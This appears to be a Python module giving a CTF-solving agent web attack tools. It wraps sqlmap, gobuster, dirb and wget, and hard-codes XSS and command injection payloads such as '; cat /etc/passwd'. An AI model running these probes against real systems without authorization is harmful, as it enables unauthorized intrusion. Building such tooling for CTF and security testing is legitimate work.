"""
web_tools.py — HTTP/web exploitation tools for the CTF agent.
"""
from __future__ import annotations

import json
import subprocess
import textwrap
import urllib.parse
from typing import Any

import requests

from agent.tool_registry import ToolSpec

SESSION = requests.Session()
SESSION.headers.update({"User-Agent": "CTF-Agent/1.0"})
DEFAULT_TIMEOUT = 15


# ─────────────────────────────────────────── helpers ────────────────────────

def _safe_request(method: str, url: str, **kwargs) -> requests.Response:
    return SESSION.request(method.upper(), url, timeout=DEFAULT_TIMEOUT, **kwargs)


def _format_response(resp: requests.Response, max_body: int = 4000) -> str:
    body = resp.text[:max_body]
    ellipsis = f"\n... ({len(resp.text) - max_body} more chars)" if len(resp.text) > max_body else ""
    return (
        f"Status: {resp.status_code}\n"
        f"Headers: {json.dumps(dict(resp.headers), indent=2)}\n\n"
        f"Body:\n{body}{ellipsis}"
    )


# ─────────────────────────────────────────── tools ──────────────────────────

def send_http_request(
    method: str = "GET",
    url: str = "",
    headers: str = "{}",
    body: str = "",
    cookies: str = "{}",
) -> str:
    """Send an HTTP request and return status, headers, and body."""
    try:
        h = json.loads(headers) if headers.strip() else {}
        c = json.loads(cookies) if cookies.strip() else {}
        resp = _safe_request(method, url, headers=h, data=body or None, cookies=c)
        return _format_response(resp)
    except Exception as exc:
        return f"ERROR: {exc}"


def crawl_website(url: str, depth: int = 1) -> str:
    """Crawl a website using wget and return discovered URLs."""
    try:
        proc = subprocess.run(
            ["wget", "--spider", "--recursive", f"--level={depth}",
             "--no-check-certificate", "-q", url],
            capture_output=True, timeout=30
        )
        output = proc.stderr.decode("utf-8", errors="replace")
        urls = [ln for ln in output.splitlines() if ln.startswith("--") or "URL:" in ln]
        return "\n".join(urls[:100]) or "No URLs discovered."
    except Exception as exc:
        return f"ERROR: {exc}"


def discover_endpoints(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt") -> str:
    """Directory and endpoint brute-force using gobuster or dirb."""
    # Try gobuster
    try:
        proc = subprocess.run(
            ["gobuster", "dir", "-u", url, "-w", wordlist, "-q", "--no-error", "-t", "20"],
            capture_output=True, timeout=60
        )
        return proc.stdout.decode("utf-8", errors="replace") or "No endpoints found."
    except FileNotFoundError:
        pass
    # Fallback: dirb
    try:
        proc = subprocess.run(
            ["dirb", url, wordlist, "-S", "-r"],
            capture_output=True, timeout=60
        )
        return proc.stdout.decode("utf-8", errors="replace")[:3000]
    except FileNotFoundError:
        return "ERROR: Neither gobuster nor dirb is installed."


def test_sql_injection(url: str, param: str = "", method: str = "GET") -> str:
    """Test for SQL injection using sqlmap."""
    cmd = ["sqlmap", "-u", url, "--batch", "--level=2", "--risk=2",
           "--output-dir=/tmp/sqlmap_out", "-q"]
    if param:
        cmd += ["-p", param]
    if method.upper() == "POST":
        cmd += ["--method=POST"]
    try:
        proc = subprocess.run(cmd, capture_output=True, timeout=90)
        return proc.stdout.decode("utf-8", errors="replace")[:4000]
    except FileNotFoundError:
        return "ERROR: sqlmap not installed."
    except subprocess.TimeoutExpired:
        return "TIMEOUT: sqlmap exceeded 90s"


def test_xss(url: str, param: str = "") -> str:
    """Test for reflected XSS by injecting common payloads."""
    payloads = [
        "<script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "';alert(1)//",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
    ]
    results = []
    for payload in payloads:
        try:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}" if param else url
            resp = _safe_request("GET", test_url)
            if payload in resp.text or "alert(1)" in resp.text:
                results.append(f"[REFLECTED] {payload}")
            else:
                results.append(f"[not reflected] {payload[:40]}")
        except Exception as exc:
            results.append(f"[ERROR] {exc}")
    return "\n".join(results)


def test_command_injection(url: str, param: str = "", method: str = "GET") -> str:
    """Test for OS command injection with common payloads."""
    payloads = [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; sleep 3",
        "' OR '1'='1",
    ]
    results = []
    for payload in payloads:
        try:
            data = {param: payload} if param else {}
            if method.upper() == "POST":
                resp = _safe_request("POST", url, data=data)
            else:
                resp = _safe_request("GET", url, params=data)
            indicators = ["uid=", "root:", "/bin/bash", "www-data"]
            found = [i for i in indicators if i in resp.text]
            if found:
                results.append(f"[VULN] payload='{payload}' → found: {found}")
            else:
                results.append(f"[clean] {payload[:40]}")
        except Exception as exc:
            results.append(f"[ERROR] {exc}")
    return "\n".join(results)


def analyze_http_response(response_text: str) -> str:
    """Extract interesting elements from an HTTP response: cookies, tokens, comments, forms."""
    import re
    findings = []

    # HTML comments
    comments = re.findall(r"<!--(.*?)-->", response_text, re.DOTALL)
    if comments:
        findings.append("HTML Comments:")
        for c in comments[:10]:
            findings.append(f"  {c.strip()[:200]}")

    # Hidden inputs
    hidden = re.findall(r'<input[^>]+type=["\']hidden["\'][^>]*>', response_text, re.IGNORECASE)
    if hidden:
        findings.append("\nHidden form fields:")
        findings.extend(f"  {h[:200]}" for h in hidden[:10])

    # JWT tokens
    jwts = re.findall(r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*', response_text)
    if jwts:
        findings.append("\nJWT tokens found:")
        findings.extend(f"  {j[:100]}" for j in set(jwts))

    # Potential flags
    flags = re.findall(r'[A-Za-z0-9_]{2,10}\{[^}]{5,60}\}', response_text)
    if flags:
        findings.append("\nPotential flags:")
        findings.extend(f"  {f}" for f in flags)

    return "\n".join(findings) if findings else "No notable elements found in response."


# ─────────────────────────────────────────── tool specs ─────────────────────

WEB_TOOLS: list[ToolSpec] = [
    ToolSpec("send_http_request", "Send any HTTP request (GET/POST/etc) and see response", {"method": "string", "url": "string", "headers": "json string (optional)", "body": "string (optional)", "cookies": "json string (optional)"}, send_http_request, "web"),
    ToolSpec("crawl_website", "Spider a website to discover linked URLs", {"url": "string", "depth": "int (optional, default=1)"}, crawl_website, "web"),
    ToolSpec("discover_endpoints", "Brute-force directories/endpoints with gobuster/dirb", {"url": "string", "wordlist": "string (optional)"}, discover_endpoints, "web"),
    ToolSpec("test_sql_injection", "Test for SQL injection using sqlmap", {"url": "string", "param": "string (optional)", "method": "string (optional)"}, test_sql_injection, "web"),
    ToolSpec("test_xss", "Test reflected XSS with common payloads", {"url": "string", "param": "string (optional)"}, test_xss, "web"),
    ToolSpec("test_command_injection", "Test for OS command injection with common payloads", {"url": "string", "param": "string (optional)", "method": "string (optional)"}, test_command_injection, "web"),
    ToolSpec("analyze_http_response", "Extract comments, hidden fields, JWT tokens and flags from HTML", {"response_text": "string"}, analyze_http_response, "web"),
]
